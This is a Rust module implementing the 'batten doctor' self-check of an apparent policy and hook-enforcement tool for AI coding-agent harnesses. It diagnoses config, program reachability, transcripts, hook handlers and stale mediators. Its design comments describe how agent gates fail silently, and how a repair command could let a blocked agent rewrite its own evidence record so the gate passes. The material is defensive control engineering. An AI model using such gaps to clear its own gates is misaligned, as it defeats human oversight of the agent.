//! `batten doctor` — the designated post-install self-check (house-style §12).
//!
//! It answers one question: **can Batten do its job in this repository?** Not
//! "is the policy any good" — that is `config lint`'s question and it renders a
//! verdict. Keeping the two apart is what lets `doctor` promise something
//! stronger than a convention.
//!
//! # `doctor` never returns a policy verdict
//!
//! Every failure it can report — no config, an unparseable one, a working
//! directory that is not a repository — is the *config or usage* class, so
//! `doctor` returns [`ExitCode::Success`] or [`ExitCode::Usage`] and never
//! [`ExitCode::Violation`]. That is deliberate rather than incidental: a
//! diagnostic that could emit `2` would be read by a mediating harness as a
//! deny, and "your checkout is misconfigured" is not "policy says no" (§7).
//! [`crate::doctor::tests`] and the end-to-end suite both pin it.
//!
//! This is also why `config lint` is *not* one of the diagnostics, tempting as
//! it is: a smell is exit `2` when `config lint` reports it, and folding it in
//! here would force either a code collision or two different answers to the same
//! question.
//!
//! # Output is byte-stable and carries no paths
//!
//! A check reports a name, a boolean, and — when it fails — a **stable reason
//! id**, never the underlying message. Messages carry absolute paths, which
//! differ per machine and would defeat byte-stability (§6) while leaking the
//! layout of someone's disk into a log (rule 4).
//!
//! Not to be confused with `mise-tasks/doctor.sh`, which gates *this repository's*
//! own provisioning (the bats submodule, rustup cross targets). That one is
//! repo tooling; this is the product verb.

use std::path::Path;

use crate::exit::ExitCode;
use crate::rules::Rule;
use crate::wiring::{committed_events, entries_under, same_file};
use crate::{config, git, hook, resolve, wiring};

/// One diagnostic's outcome.
///
/// The reason is a stable id rather than the error text, so the report is
/// byte-stable across machines and never carries a path.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct Check {
    /// The diagnostic's stable name.
    pub name: &'static str,
    /// Whether it passed.
    pub ok: bool,
    /// A stable reason id when it failed; absent when it passed.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub reason: Option<&'static str>,
    /// WHICH declared thing failed, when the class alone cannot be acted on.
    ///
    /// **A diagnosis nobody can act on is a sensor, not a check** (CLOUD-1317).
    /// `program-not-on-path` named a class and no member, so a reader learned
    /// that one of twelve `command` rows could not run and had to re-derive
    /// which — measured on this repository, where `hk` resolves only under
    /// `mise exec` and the bare token said so to nobody.
    ///
    /// **These are DECLARED IDENTIFIERS, never content**, which is what keeps
    /// non-negotiable rule 4 intact: a program name and a rule id come out of
    /// the consumer's own committed `batten.toml`, so emitting them republishes
    /// a value the reader already has rather than lifting a byte out of a file
    /// the check read. That is the same line `doctor hooks` already draws when it
    /// names a harness and an event but counts siblings rather than naming them.
    ///
    /// Sorted and deduplicated at construction, so §6 byte-stability does not
    /// depend on the order a walk happened to yield.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub subjects: Vec<String>,
}

impl Check {
    const fn passed(name: &'static str) -> Self {
        Check {
            name,
            ok: true,
            reason: None,
            subjects: Vec::new(),
        }
    }

    const fn failed(name: &'static str, reason: &'static str) -> Self {
        Check {
            name,
            ok: false,
            reason: Some(reason),
            subjects: Vec::new(),
        }
    }

    /// The same failure, naming the declared subjects a reader must act on.
    fn failed_naming(
        name: &'static str,
        reason: &'static str,
        subjects: impl IntoIterator<Item = String>,
    ) -> Self {
        let mut subjects: Vec<String> = subjects.into_iter().collect();
        subjects.sort();
        subjects.dedup();
        Check {
            name,
            ok: false,
            reason: Some(reason),
            subjects,
        }
    }

    /// The pointer line this check renders as (§6), without a trailing newline.
    #[must_use]
    pub fn line(&self) -> String {
        match self.reason {
            Some(reason) if !self.subjects.is_empty() => {
                format!("{} failed {reason} {}", self.name, self.subjects.join(" "))
            }
            Some(reason) => format!("{} failed {reason}", self.name),
            None => format!("{} ok", self.name),
        }
    }
}

/// The whole diagnosis, as the `-J` data channel renders it.
///
/// Deliberately carries no timestamp, no duration and no path: identical input
/// must yield identical bytes (§6).
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct Report {
    /// The running binary's version.
    pub version: &'static str,
    /// The content hash of the governing config surface (CLOUD-32), when it
    /// could be computed.
    ///
    /// Absent rather than empty when the config did not load or a tracked path
    /// is unreadable: a placeholder would be a *stable* value over an unknown
    /// surface, which is exactly what the epoch exists to prevent. `doctor` does
    /// not fail on that — the `config` check above already names the cause, and
    /// a diagnostic that could exit 3 for a missing file would stop being the
    /// config-or-usage-only verb §7 needs it to be.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub config_epoch: Option<String>,
    /// Whether every diagnostic passed.
    pub ok: bool,
    /// Each diagnostic, in a fixed order.
    pub checks: Vec<Check>,
}

impl Report {
    /// The exit code this report maps to.
    ///
    /// [`ExitCode::Violation`] is unreachable by construction — see the module
    /// docs. The range is the guarantee, not the branch.
    #[must_use]
    pub fn code(&self) -> ExitCode {
        if self.ok {
            ExitCode::Success
        } else {
            ExitCode::Usage
        }
    }
}

/// The committed authority is present, parses, and resolves through the §8
/// chain — including the `min_batten_version` gate (CLOUD-33).
const CONFIG: &str = "config";
/// The working directory is inside a git repository with a derivable root.
///
/// Not cosmetic: `--config-from` (CLOUD-31) and the receipt verbs both resolve
/// against it, so a checkout where this fails is one where those silently have
/// nothing to stand on.
const GIT_REPO: &str = "git-repo";
/// This harness's plan/todo surface has been SURVEYED — which is a different
/// question from whether it has one (CLOUD-472).
const PLAN_SURFACE: &str = "plan-surface";
/// Every `command`-kind rule names a program the spawn can reach — on `PATH`, or
/// through the project's pin.
///
/// A missing binary is otherwise discovered at `enforce` time, mid-run, as a
/// failure of the gate rather than of the setup. §9 is explicit that a rule
/// "names a command already on the operator's PATH" — this is the probe that
/// says whether that premise holds, before anything depends on it.
const COMMAND_PROGRAMS: &str = "command-programs";
/// The pin's memoised program set is either absent or able to answer.
///
/// Its own row rather than a mode of [`COMMAND_PROGRAMS`] (CLOUD-1324): a record
/// that stopped validating and a program that was never installed are different
/// faults with different repairs, and reporting either as the other sends a
/// reader to the wrong one.
const PIN_RECORD: &str = "pin-record";
/// The declared evidence capability is readable, or says why not (CLOUD-1035).
///
/// Emitted only where a transcript is DECLARED, which is what keeps the row a
/// diagnosis rather than a fixed line every repository carries.
const TRANSCRIPT: &str = "transcript";
/// Every declared `[[hook.handler]]` names a live retirement and resolves to a
/// program that exists (CLOUD-984).
///
/// **Diagnosed here rather than refused at load, and the placement is the
/// decision.** `config::validate` runs on every load including the mediated
/// path, so a handler refused there fails config load — exit 1, which every
/// harness reads as could-not-look and allows. A missing `owner` would disable
/// the engine for every call in the repository. A strictness whose failure mode
/// is "no policy at all" is not a strictness.
///
/// It carries the program-resolution probe for the same reason
/// [`COMMAND_PROGRAMS`] does, and against a measured defect: this repository's
/// only handler row named `mise-tasks/mcp-attach-check`, a file that does not
/// exist, for its whole life. `run_one`'s spawn failed, `Outcome::Broke` allowed
/// as designed, and the guard ran zero times while reading as wired — invisible
/// to both directions of the wiring gate, because it is neither a native
/// registration nor a sibling.
const HOOK_HANDLERS: &str = "hook-handlers";

/// Which engine the hook registrations actually reach (CLOUD-1349).
///
/// **A stale mediator reads exactly like a working one**, which is the worst
/// shape in this model rather than an ordinary bug: silence from the hook is the
/// documented signal that it IS mediating, so an engine enforcing an old rule
/// table and one enforcing the committed table produce identical evidence. Every
/// other defence sits above where this fails — `input.tree.missing` as a channel,
/// `NotAcquired` keeping `Absent` and `Unparsed` apart, `RuleSkipped` reported
/// rather than folded into clean. Measured three times in one container on
/// 2026-09-02.
///
/// **A SUB-VERB, NOT A CHECK IN THE BARE REPORT, AND THE PLACEMENT IS THE WHOLE
/// DECISION.** This landed once inside [`diagnose`] and was refused by `verify`:
/// `crates/batten/tests/it/doctor.rs::this_repository_is_healthy` went red
/// because `land` had rebuilt `target/release/batten` while the installed copy
/// was an hour old. The check was telling the truth. Whether a container's
/// install is current is a property of the WORLD, and bare `doctor` answers a
/// property of the COMMIT — so folding it in made a commit gate answer on install
/// recency. `.claude/rules/toolchain.md` records that exact defect for
/// `lock-check`, whose remedy was the same split: the pure gate keeps its
/// question, the world-fact gets its own caller. House style §2 already specifies
/// `doctor <SUB>` for a focused diagnostic, so the shape was available.
///
/// **Content, never the version string, correcting this row's own §2.** Measured:
/// `batten --version` read `0.0.137`, the workspace read `0.0.137`, and that
/// binary refused the tree's own `batten.toml` with `unknown field
/// endpoint_contains`. A config surface moves without a version bump, and on a
/// fast-forward-only trunk that is the ordinary case, so version equality does
/// not discriminate. The digest catches that and every case a version would.
///
/// **Nothing is executed.** `doctor` is `Effect::Read` and the agent allowlist is
/// `filter(effect == read)` with no second list, so spawning a program named by a
/// wiring file would put config-supplied code behind a row any consumer's agent
/// may call — CLOUD-170's actual invariant, and the reason [`on_path`] stats
/// rather than runs. Hashing a file reaches none of it.
///
/// # What this does NOT catch, measured rather than reasoned
///
/// **It compares the INSTALL against the BUILD, not the build against the
/// SOURCE.** When `target/release/batten` is itself behind the tree, both sides
/// of the comparison are equally stale, they agree, and this reports
/// [`Mediator::Current`].
///
/// Measured 2026-09-02, one command apart and while this very row was in flight:
/// `land` rebased onto a `main` that had added a `[[rule.review]]` key, the
/// engine refused the tree's own `batten.toml` with `unknown field`, and
/// `batten doctor mediator` answered `mediator ok`. Both binaries were the same
/// pre-rebase build. That is the fourth staleness occurrence in one container
/// that day and the first this check missed.
///
/// **Stated here rather than left for a reader to discover**, because a check
/// that silently answers a narrower question than its name suggests is the very
/// shape this file is against: a dead gate and a clean tree are byte-identical on
/// the decision surface. What is bought is the ORIGINAL measured failure — an
/// image-baked or hand-installed binary against a tree that builds a different
/// one — which is the case that ran unnoticed for six hours.
///
/// Closing the remainder needs a predicate over *build freshness* that is still a
/// read: comparing a binary's mtime against its sources is the obvious candidate
/// and is not obviously sound, since a rebase touches files cargo would not
/// rebuild from, so it trades this false negative for a false positive. That is a
/// separate predicate with its own design, not a tightening of this one.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "kebab-case", tag = "state")]
pub enum Mediator {
    /// The resolved binary is byte-identical to this tree's build.
    Current,
    /// Both were read and they differ.
    Stale,
    /// This tree does not build a mediator, so there is nothing to compare.
    ///
    /// Distinct from the two below: a consumer checkout is not a failed lookup,
    /// it is a question with no referent.
    NotApplicable,
    /// This tree builds one, but nothing named `batten` resolves on `PATH`.
    Unresolvable,
    /// This tree builds one and the built artifact could not be read.
    Unbuilt,
}

impl Mediator {
    /// The pointer line this renders as, without a trailing newline.
    #[must_use]
    pub const fn line(&self) -> &'static str {
        match self {
            Mediator::Current => "mediator ok",
            Mediator::Stale => "mediator failed mediator-stale",
            Mediator::NotApplicable => "mediator ok not-applicable",
            Mediator::Unresolvable => "mediator failed mediator-unresolvable",
            Mediator::Unbuilt => "mediator failed mediator-unbuilt",
        }
    }

    /// The exit code this maps to.
    ///
    /// [`ExitCode::Violation`] is unreachable, inheriting the promise the parent
    /// makes: a mediating harness reads `2` as a deny, and "your install is out
    /// of date" is not "policy says no".
    #[must_use]
    pub const fn code(&self) -> ExitCode {
        match self {
            Mediator::Current | Mediator::NotApplicable => ExitCode::Success,
            Mediator::Stale | Mediator::Unresolvable | Mediator::Unbuilt => ExitCode::Usage,
        }
    }
}

/// Compare the mediator on `PATH` against the artifact `dir` builds.
///
/// Reads both files and hashes them; spawns nothing. Length is compared first
/// only as a short-circuit — two files of different lengths cannot be identical.
#[must_use]
pub fn diagnose_mediator(dir: &Path) -> Mediator {
    // The tree builds a mediator iff it carries the crate that produces one.
    // Asking the manifest rather than looking for the artifact keeps "a consumer
    // checkout" and "batten's own checkout before its first build" distinct: the
    // second is a could-not-look and the first is not a question at all.
    if !dir.join("crates/batten/Cargo.toml").is_file() {
        return Mediator::NotApplicable;
    }
    let Some(resolved) = crate::rules::on_path_verbatim("batten") else {
        return Mediator::Unresolvable;
    };
    let built = dir.join("target/release/batten");
    let (Ok(left), Ok(right)) = (std::fs::read(&resolved), std::fs::read(&built)) else {
        return Mediator::Unbuilt;
    };
    if left.len() != right.len() {
        return Mediator::Stale;
    }
    if crate::receipt::hex_sha256(&left) == crate::receipt::hex_sha256(&right) {
        Mediator::Current
    } else {
        Mediator::Stale
    }
}

/// Whether `program` resolves to an existing file on `PATH`.
///
/// **Stats, never executes.** Running the program to see whether it exists is
/// precisely what a `read` verb may not do (§5, CLOUD-170): it would reach
/// user-supplied code from the read-only surface. A path-bearing token
/// (`./bin/tool`) is checked where it points; a bare name is looked up across
/// `PATH` entries.
/// **One lookup, shared with the spawn path.** This carried its own copy, and
/// the copy searched only the verbatim name — so on Windows it reported
/// `program-not-on-path` for `sh` while `sh.exe` sat on PATH, and this
/// repository failed its own `doctor` (CLOUD-617). Two answers to "is this
/// program on PATH" is one too many: the probe must agree with the spawn it is
/// predicting, or it diagnoses a run that would have worked.
fn on_path(program: &str) -> bool {
    if program.contains(std::path::MAIN_SEPARATOR) || program.contains('/') {
        return Path::new(program).is_file();
    }
    crate::rules::on_path_verbatim(program).is_some()
}

/// The check the declared transcript earns, or `None` where none is declared
/// (CLOUD-1035).
///
/// **`None` is the UNCONFIGURED arm and it is a decision, not a fallthrough.** A
/// repository that never named a transcript is not missing one, so it gets no row
/// rather than a passing row: a diagnostic that says `ok` about a feature nobody
/// uses is how a reader learns to skim the list, which is the opposite of what
/// this verb is for. Every other reading is a row, including the two that pass.
///
/// The reason ids are `Capability`'s own labels rather than new spellings, so a
/// reader who has seen one in a `-J` document sees the same token here.
fn transcript_reason(root: &Path) -> Option<Check> {
    let configured = resolve::resolve(root, &crate::Overrides::default())
        .ok()?
        .transcript?
        .path?;
    Some(
        match crate::transcript::resolve(root, Some(configured.as_str())) {
            // Never reached — an unconfigured transcript left above via `?` — and
            // matched rather than caught by a wildcard so a fifth variant is a
            // compile error here instead of a silent pass.
            crate::transcript::Capability::Unconfigured => Check::passed(TRANSCRIPT),
            // ABSENT IS ORDINARY AND HONEST, on the committed config's own terms.
            crate::transcript::Capability::Absent => Check::passed(TRANSCRIPT),
            // POINTER-ONLY: the capability carries a `<label>:<line>` and this
            // takes none of it. The reason id says WHAT is wrong; the line is the
            // rule-4 payload a diagnostic must not republish.
            crate::transcript::Capability::Unreadable(_) => {
                Check::failed(TRANSCRIPT, "transcript-unreadable")
            }
            crate::transcript::Capability::Present(_) => Check::passed(TRANSCRIPT),
        },
    )
}

/// Whether the pin's record is absent altogether (CLOUD-1371).
///
/// **A third reading, and it is deliberately not folded into
/// [`crate::pinned::record_is_stale`]** — that predicate answers *a record is
/// there and has stopped answering*, and widening it to include absence would
/// change what every one of its callers decides, including the repair whose
/// narrowness is what bounds its cost. Asked here as its own question, over the
/// same file, with no spawn: `doctor` is a `read` verb and may not ask the pin.
fn record_is_absent(root: &Path) -> bool {
    !crate::pinned::record_exists(root)
}

/// Whether the project's pin provides this program (CLOUD-1324).
///
/// **The probe must agree with the spawn**, which is [`on_path`]'s own rule and
/// the reason this exists: the spawn ladder resolves a pinned program through the
/// pin, so a probe asking only about bare `PATH` diagnoses a run that would have
/// worked. Nothing a toolchain manager provides is on bare `PATH` — nor should it
/// be, since a program reached around the pin is a different build — so without
/// this every pinned program reads as missing and the report is noise.
///
/// **Reads the record, never asks the pin.** Resolving spawns, and `doctor` is a
/// read verb; `pinned::cached` is a file read whose could-not-look is honest.
/// A record that cannot answer leaves the program to the `PATH` probe alone,
/// which is the conservative direction: it reports a program the spawn might
/// still recover, rather than hiding one that is genuinely gone.
fn provided_by_pin(dir: &Path, program: &str) -> bool {
    matches!(
        crate::pinned::cached(dir),
        crate::facts::Look::Is(ref programs) if programs.contains(program)
    )
}

/// Whether a handler's declared program is something that could be spawned.
///
/// **Resolved the way the DISPATCH resolves it, never a second guess.** A probe
/// that disagreed with the spawn it predicts diagnoses a run that would have
/// worked, or misses one that would not — the defect [`on_path`] records from
/// CLOUD-617, one layer over. A handler's program is relative to the repository
/// root, which is where `run_one` spawns it from, so a repo-relative path is
/// checked there and a bare name goes through the same `PATH` lookup the spawn
/// ladder's second rung uses.
///
/// Measured 2026-08-25: this repository's only handler row named a program one
/// character off — `mise-tasks/mcp-attach-check` against `…-check.sh` — and the
/// consequence was not an error but a silence. `spawn_resolving`'s ladder never
/// appends an extension, the spawn returned `NotFound`, and `Outcome::Broke`
/// allowed exactly as the door promises. The guard read as wired and ran zero
/// times.
fn handler_program_resolves(dir: &Path, program: &str) -> bool {
    if program.contains(std::path::MAIN_SEPARATOR) || program.contains('/') {
        return dir.join(program).is_file();
    }
    on_path(program)
}

/// Diagnose the repository rooted at `dir`.
///
/// Infallible by construction: every failure becomes a [`Check`] rather than an
/// error, because a diagnostic that aborts on the first problem reports one
/// symptom when the operator wants the list.
#[must_use]
pub fn diagnose(dir: &Path) -> Report {
    let mut checks = Vec::new();

    checks.push(match config::load(&dir.join(config::CONFIG_FILE)) {
        // Loading proves the file parses and the version gates pass; resolving
        // proves the §8 chain (including a `batten.local.toml`) is coherent too.
        // Both are wanted — a config that parses but whose local override is
        // refused is not a working setup.
        Ok(_) => match resolve::resolve(dir, &crate::Overrides::default()) {
            Ok(_) => Check::passed(CONFIG),
            Err(_) => Check::failed(CONFIG, "config-unresolvable"),
        },
        Err(_) if !dir.join(config::CONFIG_FILE).exists() => {
            Check::failed(CONFIG, "config-missing")
        }
        Err(_) => Check::failed(CONFIG, "config-invalid"),
    });

    checks.push(match git::repo_root(dir) {
        Ok(_) => Check::passed(GIT_REPO),
        Err(_) => Check::failed(GIT_REPO, "not-a-repository"),
    });

    // Probed off the *resolved* rule set, so a rule a local override added is
    // covered too — those are gates a run actually applies. A config that did
    // not load reports no rules rather than a second failure: `config` above
    // already named that, and repeating it would double-count one problem.
    let rules = resolve::resolve(dir, &crate::Overrides::default())
        .map(|resolved| resolved.rules)
        .unwrap_or_default();
    //
    // NAMED rather than counted (CLOUD-1317). `any()` answered whether SOME
    // declared program was unreachable, which is true or false and actionable
    // neither way: measured on this repository the answer was `true` because
    // `hk` resolves only under `mise exec`, and nothing said so. Collecting the
    // names turns the same walk into a diagnosis a reader can fix, and they are
    // this consumer's own declared tokens rather than anything the check read
    // out of a file.
    // REACHABLE MEANS REACHABLE THE WAY THE SPAWN REACHES IT, which is `PATH` OR
    // the pin (CLOUD-1324). Nothing a toolchain manager provides is on bare
    // `PATH` — nor should it be — so without the second arm every pinned program
    // reads as missing and the whole check is noise.
    let unreachable: Vec<String> = rules
        .iter()
        .filter_map(Rule::program)
        .filter(|program| !on_path(program) && !provided_by_pin(dir, program))
        .map(str::to_owned)
        .collect();
    let unreachable_names = unreachable.clone();
    checks.push(if unreachable.is_empty() {
        Check::passed(COMMAND_PROGRAMS)
    } else {
        Check::failed_naming(COMMAND_PROGRAMS, "program-not-on-path", unreachable)
    });

    // THE PIN'S OWN BOOKKEEPING, ASKED SEPARATELY — because "this program is
    // missing" and "I cannot tell whether it is" have different remedies, and
    // folding the second into the first sends a reader to install a tool that is
    // already there. Overloading the check above with it was measured doing
    // exactly that: a fixture with no pin at all reported its genuinely-absent
    // program as a stale record.
    //
    // Not fatal to the run — `spawn_resolving` re-asks the pin and re-records
    // when the reading cannot answer — but a record that stopped validating is a
    // real thing to see, and `doctor` is a read verb, so saying so is all it may
    // do.
    //
    // AND AN ABSENT RECORD IS REPORTED WHEN, AND ONLY WHEN, SOMETHING NEEDED IT
    // (CLOUD-1371). This arm read `record_is_stale` alone, which requires the
    // record to EXIST, so an absent one passed. Measured in this container: the
    // record was gone, `pin-record` said **ok**, and `command-programs` blamed a
    // tool the pin provides — two checks split apart precisely so a reader is
    // sent to the right repair, disagreeing, with the one that spoke naming the
    // wrong fault.
    //
    // Silence where no record exists AND nothing is unreachable, which keeps the
    // original reading intact for the tree it was written for: a project with no
    // pin has no record and nothing to repair, and must not be told it has a
    // fault. Tying the report to `unreachable` is what distinguishes the two
    // without asking the pin — a spawn `doctor` may not make, being a `read`
    // verb — because an absent record only COSTS anything when a declared
    // program cannot be resolved without it.
    //
    // The reasons stay distinct rather than collapsing into one token: a record
    // that stopped validating is repaired by re-resolving it, and one that never
    // existed in a session that needs it means the session-start resolution did
    // not happen or was undone. Same channel, different first move.
    checks.push(if crate::pinned::record_is_stale(dir) {
        Check::failed(PIN_RECORD, "pin-record-stale")
    } else if record_is_absent(dir) && !unreachable_names.is_empty() {
        Check::failed_naming(PIN_RECORD, "pin-record-absent", unreachable_names)
    } else {
        Check::passed(PIN_RECORD)
    });

    // THE DECLARED EVIDENCE CAPABILITY, REPORTED WHERE SOMEBODY IS ALREADY
    // LOOKING (CLOUD-1035).
    //
    // A transcript that exists and cannot be read answers `doctor`'s own question
    // — "can Batten do its job in this repository?" — with a no: `transcript.rs`
    // fails closed, so every rule keyed on it does not run and the gates that
    // record receipts refuse. Measured 2026-08-24: a torn line went unreported
    // until `mise run fix` failed on it three hours in, was misdiagnosed twice,
    // and wedged the lifecycle for three consecutive runs. CLOUD-261 named this
    // exact shape and is Done; this is that, one capability over.
    //
    // A REPORTER, NEVER A SECOND OPINION. `transcript::Capability` is already the
    // total type and this maps it — a second reading here is precisely the
    // disagreement CLOUD-819 spent a row reconciling between `lib.rs` and
    // `receipt.rs`.
    //
    // UNCONFIGURED EMITS NO CHECK AT ALL, which is the arm that keeps this from
    // being noise: a repository that never named a transcript is not missing one,
    // and a row saying `ok` about a feature nobody uses trains a reader to skim
    // the list. ABSENT IS `ok` on the committed config's own terms — `batten.toml`
    // states an absent transcript is ordinary and changes no verdict.
    //
    // AND IT IS EXPLICITLY NOT A REPAIR (the row's load-bearing half). `doctor` is
    // pinned `read` by the derived allowlist, and a sanctioned repair over the
    // evidence substrate is a laundering surface: an agent blocked by its own
    // record runs it, the record changes, the gate goes green, and after the fact
    // repair and concealment are indistinguishable. Visibility, not recovery.
    if let Some(reason) = transcript_reason(dir) {
        checks.push(reason);
    }

    // The handler table, off the same resolved config. `today` is read once
    // here — the boundary — and passed down, so the predicate itself stays a
    // pure function of its inputs and the suite can drive any date it likes.
    let handlers = resolve::resolve(dir, &crate::Overrides::default())
        .ok()
        .and_then(|resolved| resolved.hook.map(|hook| hook.handlers))
        .unwrap_or_default();
    //
    // A clock that cannot be read is COULD NOT LOOK, so the dated half is
    // skipped and the rest still runs: `waiver::today` errors only when the
    // system clock predates the Unix epoch, and reading that as "every handler
    // is overdue" would redden every checkout on a misconfigured machine.
    checks.push(
        handlers
            .iter()
            .find_map(|handler| {
                crate::waiver::today()
                    .ok()
                    .and_then(|today| handler.transitional_defect(today))
                    .or_else(|| {
                        handler
                            .run
                            .first()
                            .filter(|program| !handler_program_resolves(dir, program))
                            .map(|_| "handler-program-unresolvable")
                    })
            })
            .map_or_else(
                || Check::passed(HOOK_HANDLERS),
                |reason| Check::failed(HOOK_HANDLERS, reason),
            ),
    );

    // THE HOST'S PLAN SURFACE, REPORTED AND NEVER GATED ON (CLOUD-472).
    //
    // `plan-complete` reads a store `batten record plan` writes, so it fails
    // closed on every host and this check decides nothing about it. What it
    // answers is whether the human's NATIVE todo view can be kept in step —
    // and, more importantly, it makes an unsurveyed host say so out loud.
    //
    // `Unsurveyed` is a FAILED check rather than a passed one, which is the
    // whole reason the column has two variants. An absence of data reading as
    // an absence of capability is the trap `hook::Harness::operation_of`
    // records for Gemini and Copilot, and a diagnostic that reported "no plan
    // tool" for a host nobody has looked at would be repeating it in the one
    // place an operator goes to find out what is true.
    // OVER THE TABLE, NOT OVER THE RUNNING HOST, because `diagnose` takes a
    // directory: it answers for the checkout in front of it and has no harness
    // to ask. Inferring one from the environment would be manufacturing the
    // fact this check exists to report honestly.
    // AN UNSURVEYED HOST MUST NAME WHO OWES THE SURVEY, and naming one changes
    // no exit code. That is `#MUTANT-OWNER`'s bargain: the declaration buys that
    // the gap is STATED, never that it is forgiven, and a check that reddened on
    // every unsurveyed host would be permanently red on this repository — which
    // is how a diagnostic stops being run at all.
    //
    // What it does catch is a harness added with neither a fetch nor an owner,
    // which is the moment the gap becomes invisible.
    checks.push(
        if crate::hook::Harness::ALL.iter().any(|harness| {
            matches!(
                harness.capabilities().plan_tools,
                crate::hook::PlanTools::Unsurveyed(owner) if owner.is_empty()
            )
        }) {
            Check::failed(PLAN_SURFACE, "harness-unsurveyed-and-unowned")
        } else {
            Check::passed(PLAN_SURFACE)
        },
    );

    // The working-tree authority: `doctor` diagnoses the checkout in front of
    // it, so it does not take a base ref.
    let config_epoch = crate::epoch::compute(dir, None).ok();

    Report {
        version: config::VERSION,
        config_epoch,
        ok: checks.iter().all(|check| check.ok),
        checks,
    }
}

/// One wiring finding: the event it is about, and a stable reason id.
///
/// The event is a HOST TOKEN — `PreToolUse`, `preToolUse`, `BeforeTool` — read
/// off the derivation or off the committed file's own keys. It is not a path,
/// which is the property §5 constrains: `a_reason_id_never_carries_a_path` holds
/// over `reason`, and a hook event name has no directory in it to leak.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub struct WiringFinding {
    /// The host's spelling of the event this is about.
    pub event: String,
    /// The stable reason id.
    pub reason: &'static str,
}

/// One harness's wiring diagnosis.
///
/// `#[non_exhaustive]`, and the reason is this row's own history: it is a REPORT,
/// which grows a counter every time somebody discovers that one number was
/// carrying two questions. It grew four today. A consumer reads it and never
/// constructs it, so the attribute costs nothing it was using and makes the next
/// counter a patch rather than a declared break — the posture `handler::Ran` and
/// `handler::Dispatched` already take for the same reason.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[non_exhaustive]
pub struct HarnessWiring {
    /// The harness's stable token.
    pub harness: &'static str,
    /// How many committed registrations claim to be batten's.
    pub registrations: usize,
    /// How many commands on this surface are **not** batten's.
    ///
    /// A COUNT, never a name, and never a failure. Two separate reasons, and the
    /// second is the one that decides the boolean:
    ///
    /// * rule 4 — a sibling is a command line, which carries a path; reporting it
    ///   would put a consumer's disk layout in a diagnostic that promises not to.
    /// * whether a hook beside batten's is legitimate is a CONSUMER's judgement.
    ///   This repository refuses them and says so in `hooks-wiring-check`'s
    ///   `DECLARED` table, which names the issue retiring each — that is a fact
    ///   about this repository, not about the engine, and non-negotiable rule 1
    ///   is why it cannot move in here.
    pub siblings: usize,
    /// How many commands sit on this host's **merged** surfaces — the files it
    /// combines hook config from beyond the committed one (CLOUD-525).
    ///
    /// A COUNT, and here that is a **portability** property as well as rule 4's:
    /// a merged path is under the user's home directory and differs per machine,
    /// so emitting one would defeat §6 byte-stability and leak the layout of
    /// somebody's disk. The count is what makes an undeclared registration
    /// *visible*; deciding whether it is legitimate is a consumer's judgement,
    /// for the reason [`HarnessWiring::siblings`] gives.
    ///
    /// **This is the number the committed surface cannot see.** Measured in one
    /// container 2026-08-21, Claude Code ran three `Stop` handlers and four on
    /// `SessionStart` while every gate read two and three.
    pub merged: usize,
    /// How many of the commands in [`HarnessWiring::merged`] are **not** batten's.
    ///
    /// `merged` fuses batten's own registrations with the siblings beside them, so
    /// a consumer asking *is there a hook here that is not mine* cannot answer it
    /// from that number: the sum is non-zero wherever batten is itself on a
    /// user-level surface, which is the ordinary case rather than the exception.
    /// One number cannot carry two questions, and this is the one a consumer's
    /// own gate needs — `siblings == 0 && merged_siblings == 0` is not expressible
    /// without it.
    ///
    /// Still a COUNT and never a name, for both of [`HarnessWiring::merged`]'s
    /// reasons. What it adds is the ARITHMETIC, never a verdict: whether a sibling
    /// here is legitimate stays that consumer's judgement.
    pub merged_siblings: usize,
    /// How many of this host's merged surfaces were readable.
    ///
    /// Three-valued rather than two: a merged file that is absent is the
    /// ordinary case (most machines have no launcher file), and one that exists
    /// and cannot be parsed is a different claim. Reporting only `merged` would
    /// make "no extra registrations" and "could not look" the same number, which
    /// is the collapse `Look` exists to prevent.
    ///
    /// **Three-valued in intention and one-valued in fact, until the four fields
    /// below.** A zero here meant any of four different things — no resolvable
    /// home, a surface deduplicated against the committed file, an unreadable
    /// one, or a simply absent one — and no reader could tell which, so the
    /// collapse this field exists to prevent was reproduced one level down. The
    /// siblings below split them, and [`MergedTally::partitions`] asserts their
    /// sum against [`hook::Harness::merge_surfaces`]'s own length, so a fifth
    /// disposition cannot be added without landing somewhere countable.
    pub merged_surfaces_read: usize,
    /// Merged surfaces this host declares that are not present on disk.
    ///
    /// The ordinary case, and never a finding: most machines carry no launcher
    /// file, and a diagnosis red for its absence would be red on every
    /// developer's box for a state nobody can fix.
    pub merged_surfaces_absent: usize,
    /// Merged surfaces that exist and are not readable as the wiring file they
    /// must be — unparseable, or parsing to something that is not a hook map.
    ///
    /// Distinct from absent for the reason [`FILE_UNREADABLE`] is distinct from
    /// [`FILE_MISSING`]: two different remedies, so one number would send the
    /// reader to the wrong one.
    pub merged_surfaces_unreadable: usize,
    /// Merged surfaces that resolved to the same file as the committed wiring.
    ///
    /// A third answer rather than a kind of absence, and previously
    /// indistinguishable from it. Several hosts spell their user-level surface
    /// and their project-level one identically, so a checkout sitting AT the home
    /// directory resolves both to one file; counting it here says so instead of
    /// dropping it silently.
    pub merged_surfaces_deduplicated: usize,
    /// Every merged surface this host declares, when no home directory resolves.
    ///
    /// Whole-set rather than per-surface: with no home there is no path to join,
    /// so nothing was looked at. This is the "could not look" arm that a zero in
    /// [`HarnessWiring::merged_surfaces_read`] used to hide.
    pub merged_surfaces_unresolvable: usize,
    /// What is wrong, in derivation order.
    pub findings: Vec<WiringFinding>,
    /// Whether this harness's wiring matches the derivation.
    pub ok: bool,
}

/// The whole hook-wiring diagnosis, as the `-J` data channel renders it.
///
/// `#[non_exhaustive]` for [`HarnessWiring`]'s reason, which this row has now
/// proved for itself: a report grows a field every time somebody finds that one
/// number was carrying two questions, and a consumer reads this and never
/// constructs it.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[non_exhaustive]
pub struct WiringReport {
    /// The running binary's version.
    pub version: &'static str,
    /// Whether every harness's wiring matches.
    pub ok: bool,
    /// One row per harness with a hook-config surface, in `Harness::ALL` order.
